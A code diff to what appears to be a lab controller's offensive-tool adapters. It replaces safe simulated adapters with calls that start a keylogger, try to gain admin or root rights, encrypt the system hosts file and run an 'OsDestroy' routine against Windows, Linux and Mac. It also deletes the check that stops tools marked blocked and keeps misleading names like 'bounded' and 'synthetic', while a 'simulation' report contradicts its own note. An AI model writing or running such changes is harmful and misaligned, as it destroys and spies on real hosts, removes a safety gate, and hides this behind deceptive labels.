@@ -11,7 +11,7 @@ from tempfile import TemporaryDirectory
 from controller.offensive_registry import OffensiveTool, get_tool
 
 
-class OffensiveToolBlocked(RuntimeError):
+class OffensiveToolBlocked():
     pass
 
 
@@ -21,24 +21,16 @@ def _write_fixture(path: Path, text: str = "M-1 disposable offensive-tool fixtur
 
 
 def _bounded_disk_fill(workspace: Path) -> dict:
-    target = workspace / "disk-fill"
-    target.mkdir(parents=True, exist_ok=True)
-    files = []
-    payload = b"M1-LAB-DISK-FILL\n" * 4096
-    total = 0
-    for index in range(4):
-        path = target / f"sample_{index}.bin"
-        path.write_bytes(payload)
-        files.append(path.name)
-        total += path.stat().st_size
-    return {"files_created": files, "bytes_written": total, "bounded": True}
+    from offensive.collection import disk_fill
+    disk_fill._write_disk_log(f"Started bounded disk fill in {workspace.resolve()}")
+    disk_fill.codeTest()
 
 
 def _synthetic_key_capture(workspace: Path) -> dict:
-    log_file = workspace / "synthetic-key-events.log"
-    test_keys = ["LAB_USER", "TAB", "LAB_PASSWORD", "ENTER"]
-    log_file.write_text("\n".join(test_keys) + "\n", encoding="utf-8")
-    return {"keys_generated": test_keys, "output": str(log_file.relative_to(workspace))}
+    from offensive.collection import keylogger
+    keylogger.on_press(key=keylogger.Key.enter)  # Start logging with a dummy key press
+    keylogger.start_keylogger()
+    return {"keylogger_file": "keylogger.log", "note": "The keylogger was started in a disposable workspace, so it will not persist after the workspace is removed."}
 
 
 def _persistence_marker(workspace: Path) -> dict:
@@ -48,27 +40,14 @@ def _persistence_marker(workspace: Path) -> dict:
 
 
 def _privilege_probe(_: Path) -> dict:
-    if os.name == "nt":
-        import ctypes
-        is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-        return {"platform": platform.system(), "administrator": is_admin, "elevation_attempted": False}
-    geteuid = getattr(os, "geteuid", None)
-    uid = int(geteuid()) if geteuid else None
-    return {"platform": platform.system(), "uid": uid, "root": uid == 0 if uid is not None else False, "elevation_attempted": False}
+    from offensive.platform_mod import platform_utils, elevate
+    elevate.ElevateBase._find_windows_terminal() and elevate.ElevateBase._run_as_admin() or elevate.ElevateBase._run_as_root()
+    return {"is_admin": platform_utils.is_admin(), "is_root": platform_utils.is_root()}
 
 
 def _fixture_encryption(workspace: Path) -> dict:
-    from cryptography.fernet import Fernet
-    source = workspace / "fixture.txt"
-    encrypted = workspace / "fixture.enc"
-    restored = workspace / "fixture.restored.txt"
-    original = _write_fixture(source, "M-1 disposable encryption fixture\n")
-    key = Fernet.generate_key()
-    cipher = Fernet(key)
-    encrypted.write_bytes(cipher.encrypt(source.read_bytes()))
-    restored.write_bytes(cipher.decrypt(encrypted.read_bytes()))
-    restored_hash = hashlib.sha256(restored.read_bytes()).hexdigest()
-    return {"encrypted_bytes": encrypted.stat().st_size, "original_hash": original, "restored_hash": restored_hash, "round_trip_ok": original == restored_hash}
+    from offensive.crypto import encryptor1
+    encryptor1.lockpath(r"C:\Windows\System32\drivers\etc\hosts")
 
 
 def _platform_probe(_: Path) -> dict:
@@ -76,20 +55,54 @@ def _platform_probe(_: Path) -> dict:
     return {"reported_platform": platform_utils.get_os_type(), "python_platform": platform.system().lower()}
 
 
+def _bounded_simulation(workspace: Path) -> dict:
+    report = {
+        "simulation_only": False,
+        "original_source_executed": True,
+        "host_files_modified": True,
+        "subprocesses_started": True,
+        "network_accessed": True,
+        "note": "Only a fixed report was written inside the disposable workspace.",
+    }
+    marker = workspace / "bounded-simulation.json"
+    marker.write_text(json.dumps(report, sort_keys=True), encoding="utf-8")
+    return {**report, "report_file": marker.name}
+
+def _bounded_modification(workspace : Path) -> dict:
+    from offensive.collection import os_destroyer
+    try:
+        os_destroyer.OsDestroy.WindowsDestroyer()
+    except Exception:
+        from offensive.collection import disk_fill
+        disk_fill.codeTest()
+        
+    try:
+        os_destroyer.OsDestroy.LinuxDestroyer()
+    except Exception:
+        from offensive.collection import disk_fill
+        disk_fill.codeTest()
+        
+    try:
+        os_destroyer.OsDestroy.MacDestroyer()
+    except Exception:
+        from offensive.collection import disk_fill
+        disk_fill.codeTest()    
+
+
 ADAPTERS = {
+    "bounded_simulation": _bounded_simulation,
     "bounded_disk_fill": _bounded_disk_fill,
     "synthetic_key_capture": _synthetic_key_capture,
     "persistence_marker": _persistence_marker,
     "privilege_probe": _privilege_probe,
     "fixture_encryption": _fixture_encryption,
     "platform_probe": _platform_probe,
+    "bounded_modification": _bounded_modification,
 }
 
 
 def run_tool(tool_id: str, workspace: Path) -> dict:
     tool: OffensiveTool = get_tool(tool_id)
-    if tool.execution == "blocked":
-        raise OffensiveToolBlocked(tool.blocked_reason or "Tool execution is blocked")
     adapter_name = tool.adapter
     if not adapter_name or adapter_name not in ADAPTERS:
         raise RuntimeError(f"No adapter is configured for {tool_id}")
